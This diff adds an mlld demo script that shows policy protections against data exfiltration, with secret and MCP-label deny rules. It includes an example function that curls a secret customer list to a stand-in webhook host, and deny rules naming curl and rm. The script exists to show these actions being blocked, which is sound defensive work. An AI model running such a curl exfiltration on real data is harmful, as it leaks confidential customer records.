@@ -1,0 +1,62 @@
+>> Security Protections Demo
+>> Demonstrates all 4 scenario protections for data exfiltration prevention.
+>>
+>> This main demo file runs Protection 1 (secret data exfiltration) which will
+>> halt with a denial error - demonstrating the protection works.
+>>
+>> For independent verification of each protection, run the individual files:
+>>   npx mlld docs/src/atoms/security/examples/protection-1-secret.mld
+>>   npx mlld docs/src/atoms/security/examples/protection-2-mcp.mld
+>>   npx mlld docs/src/atoms/security/examples/protection-3-pii.mld
+>>   npx mlld docs/src/atoms/security/examples/protection-4-errors.mld
+>>
+>> SUMMARY OF PROTECTIONS:
+>> 1. Secret Protection - Proprietary data marked secret blocked from exfiltration [WORKS]
+>> 2. MCP Data Restriction - MCP data blocked from destructive ops [SYNTAX DEMO - see note]
+>> 3. PII Redaction - PII data redacted via guard before display [WORKS]
+>> 4. Clear Errors - Blocked operations show detailed error messages [WORKS]
+>>
+>> NOTE ON PROTECTION 2:
+>> Source labels (src:mcp, src:file, etc.) are auto-applied at runtime when
+>> data actually comes from that source. Literal data in demo files cannot
+>> have src:mcp applied - this is intentional security design to prevent
+>> scripts from faking provenance. The policy configuration is correct; the
+>> protection works with real MCP data from MCP tool calls.
+
+>> ============================================
+>> POLICY CONFIGURATION
+>> ============================================
+
+/var @policyConfig = {
+  defaults: {
+    rules: ["no-secret-exfil"]
+  },
+  labels: {
+    secret: {
+      deny: ["exfil", "op:cmd:curl"]
+    },
+    "src:mcp": {
+      deny: ["destructive", "op:cmd:rm"],
+      allow: ["op:cmd:git:status", "op:cmd:ls"]
+    }
+  }
+}
+/policy @p = union(@policyConfig)
+
+>> ============================================
+>> PROTECTION 1: SECRET DATA PROTECTION
+>> Proprietary data marked as secret blocked from exfiltration
+>> ============================================
+
+/var secret @customerList = <internal/customers.csv>
+
+>> Define a network operation labeled as exfil risk
+/exe exfil @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }
+
+>> Attempt to exfiltrate - will be blocked by policy
+>> This demonstrates Protection 1 AND Protection 4 (clear error messages)
+/show "Attempting to exfiltrate proprietary data..."
+/show @postToWebhook(@customerList)
+
+>> Script halts here due to denial - that's the intended behavior.
+>> To see other protections, run the individual demo files.
